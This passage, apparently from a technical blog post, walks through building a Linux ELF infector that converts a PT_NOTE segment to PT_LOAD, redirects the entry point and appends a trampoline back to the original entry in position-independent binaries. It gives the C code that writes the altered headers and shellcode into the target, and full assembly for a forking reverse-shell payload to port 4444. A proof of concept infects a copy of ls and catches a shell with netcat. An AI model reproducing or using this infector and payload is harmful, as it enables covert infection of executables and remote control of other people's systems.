***Why do we need the patch?*** Modern ELF binaries are often built to use ASLR and therefore tend to be position independent executables. That is to say, each time an ELF file runs, its address layout is semi-randomized and loaded into a different memory space.[^12] It achieves this by implementing a random base address.

This means we can't just hardcode a return address to go to after our malware executes. And instead, we rely on this one weird trick we append to the end of our malware code to help us jump back to the original entry point.[^13]

The constants end up representing our malware shellcode size, our memory_offset (the new e_entry), and the original entry point that we 

With our bytes now patched into this mini program, the logic of the assembly code works like this. Think about it. 

*After* our malware has executed, we slide into the `jump_shellcode`. We first call `get_foo` and store the stack pointer in `rax` and then return. 

We then move our constants -- the malware shellcode size, patched entry, and the original start address, to registers `r9`, `r10`, and `r11`. 

Then we do the following trick. You can visualize this pretty clearly. Remember, after our virus has executed, we are currently at the *end* of the malware shellcode, where we enter the additional `jump_shellcode` array. So, in order to find out where we are, we have to work *backwards*. 

So first we substract the size of our malware shellcode `VSIZE` from the stack pointer in `rax`. Then we subtract `5` to adjust for the size of the `get_foo` instruction itself. 

At this point in time, the stack pointer is now effectively back at the patched `ENTRY` offset. But we want to get to the original `START` entry point. So we substract the `ENTRY` offset, extracting the base randomization!

And now we add back the original entry point `START` we stored in `r11` to `rax`. That is, `rax` now contains the original entry point so we can call `jmp rax`, landing into the ELF's original entry point and preserving the program's host behavior -- every time -- even though the executable is position independent.

With our `jump_shellcode` appended to our original shellcode, we write all of the alterations back to the ELF binary:


```C

   // Append shellcode to the very end of the target ELF
    if (lseek(elf_fd, 0, SEEK_END) < 0) {
        fprintf(stderr, "Error seeking to end of ELF file: %s\n", strerror(errno));
        close(elf_fd);
        free(elf_header);
        free(program_headers);
        free(shellcode);
        exit(1);
    }
    if (write(elf_fd, shellcode, shellcode_len) != (ssize_t)shellcode_len) {
        fprintf(stderr, "Error writing shellcode to ELF file\n");
        close(elf_fd);
        free(elf_header);
        free(program_headers);
        free(shellcode);
        exit(1);
    }

//snipped
```

```C
// Write the ELF64 program headers to the file at offset phoff
// Return 0 on success, or non-zero on failure

int write_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum, Elf64_Phdr *phdrs) {
    if (lseek(fd, phoff, SEEK_SET) < 0) {
        fprintf(stderr, "Error seeking to program headers offset for writing\n");
        return 1;
    }
    size_t total_size = sizeof(Elf64_Phdr) * phnum;
    if (write(fd, phdrs, total_size) != (ssize_t)total_size) {
        fprintf(stderr, "Error writing program headers to ELF file\n");
        return 1;
    }
    return 0;
}


// Write the ELF64 header to the beginning of the file
// Return 0 on success, or non-zero on failure

int write_elf64_header(int fd, Elf64_Ehdr *header) {
    if (lseek(fd, 0, SEEK_SET) < 0) {
        fprintf(stderr, "Error seeking to beginning of ELF file for header writing\n");
        return 1;
    }
    if (write(fd, header, sizeof(Elf64_Ehdr)) != sizeof(Elf64_Ehdr)) {
        fprintf(stderr, "Error writing ELF header to file\n");
        return 1;
    }
    return 0;
}
````



## Assembling a Payload

Embarrassingly, it took me a little while to get a reliable payload working. Initially, my program would segfault and I thought I messed up the infector. At another point, it would segfault while the shell would survive. And as I got closer, it would sometimes *almost* work--but yet still segfault.

```text
$ ./ls
Segmentation fault (core dumped)
$ ./ls
Segmentation fault (core dumped)
$ ./ls
elf_infector  maybe    maybe2    maybe3.s  maybe4.s  maybe5.s  maybe6.s  maybe7.s  maybe8.s
ls        maybe.s  maybe2.s  maybe4    maybe5    maybe6    maybe7    maybe8
Segmentation fault (core dumped)
$ ./ls
elf_infector  maybe    maybe2    maybe3.s  maybe4.s  maybe5.s  maybe6.s  maybe7.s  maybe8.s
ls        maybe.s  maybe2.s  maybe4    maybe5    maybe6    maybe7    maybe8
Segmentation fault (core dumped)
$ ./ls
Segmentation fault (core dumped)
$ ./ls
elf_infector  maybe    maybe2    maybe3.s  maybe4.s  maybe5.s  maybe6.s  maybe7.s  maybe8.s
ls        maybe.s  maybe2.s  maybe4    maybe5    maybe6    maybe7    maybe8
Segmentation fault (core dumped)


(╯°□°）╯︵ ┻━┻

``` 

One issue was the way that I originally ordered the logic of the `fork` in my payload code. Initially I tried to jump into the `fork`. And then I accidentally mucked up the stack. But then I realized that you could just spawn it and return to the parent process pretty easily. 

The other issues were with `ret` sometimes messing up the stack alignment. If you call `ret` at the end, during the return to the parent process, it messes up the stack.

Eventually, I realized that the answer to all of this was a lot more straight forward and that my approach to using `fork` to spawn a process in the background was feasible and could be improved. And that the stack could in fact be preserved and restored in a reliable way. 

After a bit of trial and error -- and remembering to correctly return the stack pointer -- the shellcode seems reliable now. In the end, the stable assembly code I ended up creating goes something like this: 

First, we try to preserve the behavior of the infected host binary by saving all of the registers by pushing them to the stack, along with the stack pointer.

Only then do we try to call the `fork` syscall. The `child_process` then spawns off where it prepares its networking code.

Inside the forked `child_process`, we prepare to use the `socket` syscall by setting up the `AF_INET`, `SOCK_STREAM`, and `IPPROTOC_TCP` arguments.

If the socket setup fails, our `child_process` -- now separated from the parent -- fails silently. Otherwise, we likely have a good file descriptor and so we move it to `rdi`.

Continuing, we prepare to use the `connect` syscall. First we `xor` the `rdx` register clearing it before pushing it to the stack as a `NULL` pad, before pushing the address we want to connect to. Here, we just use localhost, `127.0.0.1`, and our chosen port `4444`. 

We push the AF_INET (address family) `2`, then move the stack pointer to `rsi` for the `sockaddr` pointer and set it to its correct structure size of 16 bytes. 

We make the `connect` syscall which uses the previously mentioned bits along with our file descriptor in `rdi`, and if it fails, we exit gracefully. Otherwise, we setup to duplicate the file descriptor with `dup2` and move on to execute our shell.

>"*dup2 doesn't switch the file descriptors, it makes them equivalent. After dup2(f1, 0), whatever file was opened on descriptor f1 is now also opened (with the same mode and position) on descriptor 0, i.e. on standard input.*

>*If the target file descriptor was open, it is closed by the dup2 call. This is useful (among other things) when you have part of a program that reads or write from the standard file descriptors. For example, suppose that somefunc() reads from standard input, but you want it to read from a different file from where the rest of the program is getting its standard input. Then you can do (error checking omitted):*"


```C
int save_stdin = dup(0);
int somefunc_input_fd = open("input-for-somefunc.data", O_RDONLY);
dup2(somefunc_input_fd, 0);
/* Now the original stdin is open on save_stdin, and input-for-somefunc.data on 
both somefunc_input_fd and 0. */
somefunc();
close(somefunc_input_fd);
dup2(save_stdin, 0);
close(save_stdin);
```

This useful insight brought to you by netizen ***"Gilles 'SO- stop being evil'" of StackOverflow***


`Dup2` lets us duplicate the file descriptor to handle `stdin`, `stdout`, and `stderr` pipes. After we decrement through the `dup2_loop`, we can use them with a shell.

So we build the `/bin/sh` pathname array and move it to `rbx`, followed by the *path* to the *argument* of the *pathname*!

Our final code looks like this, with `execve("/bin/sh", ["/bin/sh"], NULL)`. If all goes well, we receive a shell on our listener and the original behavior of our infected host program is preserved.


```nasm
BITS 64
global _start

section .text
_start:
                                ; save original stack pointer 
    mov r12, rsp                ; preserve rsp in r12

                                ; save all registers
    push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push rbp
    push r8
    push r9
    push r10
    push r11

                                ; fork to isolate shellcode execution
    mov rax, 57                 ; sys_fork
    syscall
    test rax, rax
    jnz parent                  ; parent continues host execution

child_process:
                                ; socket syscall
                                ; int socket(int domain, int type, int protocol)
    mov rax, 41                 ; sys_socket
    mov rdi, 2                  ; AF_INET
    mov rsi, 1                  ; SOCK_STREAM
    mov rdx, 6                  ; IPPROTO_TCP
    syscall
    cmp rax, 0
    jl exit                     ; if socket fails, exit

                                ; save socket file descriptor in rdi
    mov rdi, rax

                                ; connect syscall
                                ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
    mov rax, 42                 ; sys_connect
                                ; build sockaddr_in structure on the stack
    xor rdx, rdx
    push rdx                    ; null pad
    push dword 0x0100007f       ; 127.0.0.1, ip address
    push word 0x5c11            ; port 4444, network byte order
    push word 2                 ; AF_INET
    mov rsi, rsp                ; pointer to sockaddr_in structure
    mov rdx, 16                 ; size of sockaddr_in
    syscall
    cmp rax, 0
    jl exit                     ; if connect fails, exit

                                ; dup2 syscall: int dup2(int oldfd, int newfd)
    mov rsi, 3                  ; Start with stderr (2), work down to stdin (0)
dup2_loop:
    dec rsi                     ; Decrement file descriptor (2 -> 1 -> 0)
    mov rax, 33                 ; sys_dup2
    syscall
    jnz dup2_loop               ; loop until rsi is 0

                                ; execve syscall
                                ; int execve(const char *pathname, char *const argv[], char *const envp[])
    xor rax, rax
    push rax                    ; NULL terminator
    mov rbx, 0x68732f6e69622f2f ; "//bin/sh" in reverse byte order
    push rbx
    mov rdi, rsp                ; Pathname pointer

    push rax                    ; NULL terminator for argv
    push rdi                    ; pointer to the string "//bin/sh"
    mov rsi, rsp                ; argv -> [pointer_to_string, NULL]
    xor rdx, rdx                ; envp ->NULL
    mov al, 59                  ; syscall, execve
    syscall

                                ; if execve fails, exit
exit:
    xor rax, rax
    mov al, 60                  ; sys_exit
    xor rdi, rdi
    syscall

parent:
                                ; restore registers and continue host execution
    pop r11
    pop r10
    pop r9
    pop r8
    pop rbp
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax
    mov rsp, r12                ; restore stack pointer



```

The last thing we do in order to ensure our exploit runs and lands smoothly is to `pop` all of our registers back in the proper reverse order that we pushed them -- and then move the stack pointer we saved earlier in `r12` back to `rsp`.


## Proof of Concept

```text
$ gcc -o elf_infector elf_infector.c
$ cp $(which ls) ls
$ nasm -o shellcode shellcode.s
$ ./elf_infector ./ls shellcode
[+] Found PT_NOTE section
[+] Changing to PT_LOAD
[+] Patched e_entry
$ ./ls
elf_infector  elf_infector.c  ls  shellcode  shellcode.s
```

Meanwhile... in our other console:

```text
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 51020
cat /etc/issue
Ubuntu 24.04.2 LTS \n \l

uname -a
Linux vr 6.8.0-53-generic #55-Ubuntu SMP PREEMPT_DYNAMIC Fri Jan 17 15:37:52 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux


```


[ELF Infector on Github.](https://github.com/hexagr/elf_infector)

## V2

You might have noticed a possible discrepancy in the core functionality of our program where we modify the program headers. We added the `sc_len` derived from our `shellcode_len` value to the `p_filesz` and `p_memsz` to make room for our shellcode.

In that scenario, we called the `patch` function *afterward*, which modifies both the `shellcode_len` and shellcode buffer, extending them both before pointing them to a new shellcode buffer and length. And afterward, we then write it back to the ELF file. 

But the ELF segment modififications we specified before in the `PT_LOAD` segment -- `p_filesz` and `p_memsz` -- still have the *old* shellcode length.

Luckily, memory from  `p_filesz` through `p_memsz` [actually gets rounded](https://codebrowser.dev/linux/linux/fs/binfmt_elf.c.html#396) up to the next page size for alignment purposes. So our patched shellcode still runs even though we didn't specify the new length when manipulating the `PT_LOAD` fields. 


```C
/*
 * Map "eppnt->p_filesz" bytes from "filep" offset "eppnt->p_offset"
 * into memory at "addr". (Note that p_filesz is rounded up to the
 * next page, so any extra bytes from the file must be wiped.)
 */
static unsigned long elf_map(struct file *filep, unsigned long addr,
    const struct elf_phdr *eppnt, int prot, int type,
    unsigned long total_size)
{
  unsigned long map_addr;
  unsigned long size = eppnt->p_filesz + ELF_PAGEOFFSET(eppnt->p_vaddr);
  unsigned long off = eppnt->p_offset - ELF_PAGEOFFSET(eppnt->p_vaddr);
  addr = ELF_PAGESTART(addr);
  size = ELF_PAGEALIGN(size);
  /* mmap() will return -EINVAL if given a zero size, but a
   * segment with zero filesize is perfectly valid */
  if (!size)
    return addr;
  /*
  * total_size is the size of the ELF (interpreter) image.
  * The _first_ mmap needs to know the full size, otherwise
  * randomization might put this image into an overlapping
  * position with the ELF binary image. (since size < total_size)
  * So we first map the 'big' image - and unmap the remainder at
  * the end. (which unmap is needed for ELF images with holes.)
  */
  if (total_size) {
    total_size = ELF_PAGEALIGN(total_size);
    map_addr = vm_mmap(filep, addr, total_size, prot, type, off);
    if (!BAD_ADDR(map_addr))
      vm_munmap(map_addr+size, total_size-size);
  } else
    map_addr = vm_mmap(filep, addr, size, prot, type, off);
  if ((type & MAP_FIXED_NOREPLACE) &&
      PTR_ERR((void *)map_addr) == -EEXIST)
    pr_info("%d (%s): Uhuuh, elf segment at %px requested but the memory is mapped already\n",
      task_pid_nr(current), current->comm, (void *)addr);
  return(map_addr);
}
```

And:

```C
/*
 * Map "eppnt->p_filesz" bytes from "filep" offset "eppnt->p_offset"
 * into memory at "addr". Memory from "p_filesz" through "p_memsz"
 * rounded up to the next page is zeroed.
 */
static unsigned long elf_load(struct file *filep, unsigned long addr,
    const struct elf_phdr *eppnt, int prot, int type,
    unsigned long total_size)
{
  unsigned long zero_start, zero_end;
  unsigned long map_addr;
  if (eppnt->p_filesz) {
    map_addr = elf_map(filep, addr, eppnt, prot, type, total_size);
    if (BAD_ADDR(map_addr))
      return map_addr;
    if (eppnt->p_memsz > eppnt->p_filesz) {
      zero_start = map_addr + ELF_PAGEOFFSET(eppnt->p_vaddr) +
        eppnt->p_filesz;
      zero_end = map_addr + ELF_PAGEOFFSET(eppnt->p_vaddr) +
        eppnt->p_memsz;
      /*
       * Zero the end of the last mapped page but ignore
       * any errors if the segment isn't writable.
       */
      if (padzero(zero_start) && (prot & PROT_WRITE))
        return -EFAULT;
    }
  } else {
    map_addr = zero_start = ELF_PAGESTART(addr);
    zero_end = zero_start + ELF_PAGEOFFSET(eppnt->p_vaddr) +
      eppnt->p_memsz;
  }
  if (eppnt->p_memsz > eppnt->p_filesz) {
    /*
     * Map the last of the segment.
     * If the header is requesting these pages to be
     * executable, honour that (ppc32 needs this).
     */
    int error;
    zero_start = ELF_PAGEALIGN(zero_start);
    zero_end = ELF_PAGEALIGN(zero_end);
    error = vm_brk_flags(zero_start, zero_end - zero_start,
             prot & PROT_EXEC ? VM_EXEC : 0);
    if (error)
      map_addr = error;
  }
  return map_addr;
}
```

Our original proof of concept works fine. But we can rewrite the logic like this, calling the `patch` function first, getting the updated shellcode length *before modifying* `p_filesz` and `p_memsz`. I mean, if we were going to be pedantic about it.

```C
    // Patch shellcode to jump to the original entry point after finishing
    // 
    // We'll be setting e_entry to memory_offset, so we we'll pass it
    // ahead of time to the patch function 
    patch(&shellcode, &shellcode_len, memory_offset, original_entry);
    

    // After the patch function executes, our shellcode length and buffer 
    // are different. Update sc_len to the patched length to be pedantic
    // 
    uint64_t sc_len = (uint64_t)shellcode_len;

    // Look for PT_NOTE section
    for (int i = 0; i < elf_header->e_phnum; i++) {
        if (program_headers[i].p_type == PT_NOTE) {
            // Convert to a PT_LOAD section with values to load shellcode
            printf("[+] Found PT_NOTE section\n");
            printf("[+] Changing to PT_LOAD\n");
            program_headers[i].p_type = PT_LOAD;
            program_headers[i].p_flags = PF_R | PF_X;
            program_headers[i].p_offset = file_offset;
            program_headers[i].p_vaddr = memory_offset;
            program_headers[i].p_memsz += sc_len;
            program_headers[i].p_filesz += sc_len;
            // Patch the ELF header to start at the shellcode
            elf_header->e_entry = memory_offset;
            printf("[+] Patched e_entry\n");
            break;
        }
    }
```

[^1]: https://github.com/torvalds/linux/blob/master/include/uapi/linux/elf.h#L226
[^2]: https://man7.org/linux/man-pages/man5/elf.5.html
[^3]: https://docs.oracle.com/cd/E19683-01/817-3677/chapter6-83432/index.html
[^4]: https://elixir.bootlin.com/linux/v6.13.4/source/fs/binfmt_elf.c#L362
[^5]: https://man7.org/linux/man-pages/man2/execve.2.html
[^6]: https://man7.org/linux/man-pages/man2/brk.2.html
[^7]: https://stackoverflow.com/questions/6988487/what-does-the-brk-system-call-do
[^8]: https://elixir.bootlin.com/linux/v6.13.4/source/fs/binfmt_elf.c#L734
[^9]: https://docs.oracle.com/cd/E19683-01/816-1386/6m7qcobkp/index.html
[^10]: https://elixir.bootlin.com/glibc/glibc-2.1/source/elf/rtld.c
[^11]: https://docs.oracle.com/cd/E19683-01/816-1386/chapter6-83432/index.html
[^12]: https://en.wikipedia.org/wiki/Address_space_layout_randomization#Linux
[^13]: "Note on resolving Elf_Hdr->e_entry in PIE executables." https://archive.org/details/pocorgtfo20/page/n49/mode/1up
